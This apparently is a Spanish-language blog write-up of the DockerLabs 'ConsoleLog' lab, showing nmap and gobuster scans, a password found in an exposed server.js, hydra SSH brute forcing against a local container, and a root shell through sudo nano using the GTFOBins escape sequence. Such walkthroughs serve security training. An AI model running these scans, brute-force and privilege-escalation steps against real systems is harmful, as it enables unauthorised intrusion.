---
layout: post
title: DockerLabs - ConsoleLog
summary: "Write-up del laboratorio ConsoleLog de DockerLabs"
author: elcybercurioso
date: 2025-10-27 13:00
categories: [Post, DockerLabs]
tags: [fácil, node.js, ssh, privesc, sudo]
media_subpath: "/assets/img/posts/dockerlabs_consolelog"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Consolelog]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 15:03 GMT
Initiating ARP Ping Scan at 15:03
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:03, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:03
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 5000/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:03, 9.88s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000030s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Consolelog]
└─$ nmap -sCV -p80,3000,5000 172.17.0.2                           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 15:03 GMT
Nmap scan report for 172.17.0.2
Host is up (0.000063s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Mi Sitio
|_http-server-header: Apache/2.4.61 (Debian)
3000/tcp open  http    Node.js Express framework
|_http-title: Error
5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 f8:37:10:7e:16:a2:27:b8:3a:6e:2c:16:35:7d:14:fe (ECDSA)
|_  256 cd:11:10:64:60:e8:bf:d9:a4:f4:8e:ae:3b:d8:e1:8d (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

## análisis

Al acceder al puerto 80 de la maquina, nos encontramos con la siguiente pagina web:

![Desktop View](/20251026160612.webp){: width="972" height="589" .shadow}

Si miramos en el código de la pagina, encontramos que el botón, al ser accionado, lanza el método `authenticate()` del fichero `authenticate.js`:

![Desktop View](/20251026160641.webp){: width="972" height="589" .shadow}

Dicho método nos da algunas pistas de por donde podemos seguir:

![Desktop View](/20251026160731.webp){: width="972" height="589" .shadow}

Si tratamos de acceder al recurso llamado `/recurso/`, vemos que nos da un error:

![Desktop View](/20251026160809.webp){: width="972" height="589" .shadow}

Por ello, probamos algo diferente, que en este caso es tratar de obtener por fuerza bruta otros recursos disponibles:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Consolelog]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 234]
/backend              (Status: 301) [Size: 310] [--> http://172.17.0.2/backend/]
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
```

Nos encontramos con el recurso `backend`, en el que nos listan el contenido de la carpeta del servicio desplegado en el puerto 3000 de la maquina:

![Desktop View](/20251026162205.webp){: width="972" height="589" .shadow}

Revisando el fichero `server.js`, encontramos una contraseña:

![Desktop View](/20251027005414.webp){: width="972" height="589" .shadow}

## explotación

Probamos a ver si la contraseña pertenece a algún usuario por SSH empleando `hydra` para aplicar fuerza bruta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Consolelog]
└─$ hydra -L /usr/share/seclists/Passwords/rockyou.txt -p lapa******************************** ssh://172.17.0.2:5000 -t 64 -I 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-26 15:43:12
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:14344399/p:1), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:5000/
[5000][ssh] host: 172.17.0.2   login: l****   password: lapa********************************
```

Concluimos que la contraseña pertenece a cierto usuario por SSH, y nos conectamos con dichas credenciales:

![Desktop View](/20251027005115.webp){: width="972" height="589" .shadow}

## escalada de privilegios

Revisando los permisos SUDO del usuario obtenido, encontramos que puede ejecutar el binario `/usr/bin/nano` como el usuario `root`:

```bash
l*****@dfebfa8554fa:~$ sudo -l
Matching Defaults entries for l***** on dfebfa8554fa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User l**** may run the following commands on dfebfa8554fa:
    (ALL) NOPASSWD: /usr/bin/nano
```

Comprobamos en [GTFOBins](https://gtfobins.github.io/gtfobins/nano/#sudo) que podemos obtener una consola como el usuario `root` realizando las siguientes acciones:

![Desktop View](/20251026164557.webp){: width="972" height="589" .shadow}

La secuencia es: [Ctrl+R] + [Ctrl+X] + la cadena `reset; sh 1>&0 2>&0`

![Desktop View](/20251026164922.webp){: width="972" height="589" .shadow}

Una vez introducido, vemos que obtenemos la consola:

![Desktop View](/20251027010031.webp){: width="972" height="589" .shadow}

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
